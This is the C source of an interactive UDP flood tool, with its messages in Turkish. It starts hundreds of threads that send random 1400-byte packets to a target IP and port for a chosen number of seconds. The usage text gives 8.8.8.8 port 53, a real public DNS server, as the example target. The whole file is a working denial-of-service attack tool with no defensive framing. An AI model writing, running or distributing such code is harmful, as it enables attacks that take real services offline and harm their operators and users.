#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>

#define PAYLOAD_SIZE 1400
#define THREAD_PER_PROCESS 100
#define MAX_CMD 64  // MAX_INPUT çakışması nedeniyle değiştirildi

volatile int calis = 1;
char hedef_ip[16];
int hedef_port;
int sure;
int process_count;
int thread_per_process = THREAD_PER_PROCESS;
int aktif_islem_sayisi = 0;
pthread_t *threads = NULL;

// RENKLI PROMPT
void prompt() {
    printf("\n");
    char *text = " root@slient ~> ";
    int line[] = {17,17,17,17,17,17,17,17,129,129,129,129,129,129,129};
    int len = sizeof(line)/sizeof(int);
    for (int i = 0; text[i] != '\0'; i++) {
        int color = line[i % len];
        printf("\033[48;5;%dm\033[38;5;15m%c", color, text[i]);
    }
    printf("\033[0m");
    fflush(stdout);
}

void *udp_gonder(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    
    unsigned char *veri = malloc(PAYLOAD_SIZE);
    if (!veri) { close(sock); return NULL; }
    for (int i = 0; i < PAYLOAD_SIZE; i++) veri[i] = rand() % 256;
    
    while (calis) {
        if (sendto(sock, veri, PAYLOAD_SIZE, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            close(sock);
            sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) break;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
        }
    }
    free(veri);
    close(sock);
    return NULL;
}

void saldiri_baslat(char *ip, int port, int sure_saniye) {
    strcpy(hedef_ip, ip);
    hedef_port = port;
    sure = sure_saniye;
    calis = 1;
    
    process_count = sysconf(_SC_NPROCESSORS_ONLN) * 2;
    int toplam_thread = process_count * thread_per_process;
    
    printf("\n[+] Hedef: %s:%d\n", hedef_ip, hedef_port);
    printf("[+] Süre: %d saniye\n", sure);
    printf("[+] İşlem: %d, Thread/işlem: %d\n", process_count, thread_per_process);
    printf("[+] Saldırı başladı. Durdurmak için 'stop' yazın.\n\n");
    
    threads = malloc(sizeof(pthread_t) * toplam_thread);
    if (!threads) return;
    
    int idx = 0;
    for (int i = 0; i < process_count; i++) {
        for (int j = 0; j < thread_per_process; j++) {
            pthread_create(&threads[idx++], NULL, udp_gonder, NULL);
        }
    }
    aktif_islem_sayisi = toplam_thread;
    
    time_t baslangic = time(NULL);
    char input[MAX_CMD];
    
    while (time(NULL) - baslangic < sure && calis) {
        prompt();
        if (fgets(input, sizeof(input), stdin) == NULL) break;
        input[strcspn(input, "\n")] = 0;
        
        if (strcmp(input, "stop") == 0) {
            calis = 0;
            printf("[+] Durduruluyor...\n");
            break;
        } else if (strcmp(input, "status") == 0) {
            printf("[+] Çalışıyor: %d işlem, %d thread/işlem\n", process_count, thread_per_process);
        } else {
            printf("[-] Bilinmeyen komut: %s\n", input);
        }
    }
    
    calis = 0;
    sleep(1);
    // pthread_cancel yerine pthread_join ile temizleme
    for (int i = 0; i < aktif_islem_sayisi; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);
    threads = NULL;
    aktif_islem_sayisi = 0;
    printf("[+] Saldırı tamamlandı.\n\n");
}

int main() {
    printf("\n=== UDP FLOOD ARACI (C) ===\n");
    printf("Komut satırından çalıştır: ./udpc\n");
    printf("Sonra içine yaz: 8.8.8.8 53 60\n");
    printf("Komutlar: stop | status\n\n");
    
    char input[MAX_CMD];
    
    while (1) {
        prompt();
        if (fgets(input, sizeof(input), stdin) == NULL) break;
        input[strcspn(input, "\n")] = 0;
        
        if (strcmp(input, "exit") == 0 || strcmp(input, "quit") == 0) {
            printf("[+] Çıkılıyor...\n");
            break;
        }
        
        char ip[16];
        int port, sure_saniye;
        if (sscanf(input, "%15s %d %d", ip, &port, &sure_saniye) == 3) {
            if (port > 0 && port < 65536 && sure_saniye > 0) {
                saldiri_baslat(ip, port, sure_saniye);
            } else {
                printf("[-] Geçersiz port veya süre. Örnek: 8.8.8.8 53 60\n");
            }
        } else {
            printf("[-] Format: <IP> <PORT> <SANIYE>\n");
            printf("    Örnek: 8.8.8.8 53 60\n");
        }
    }
    return 0;
}
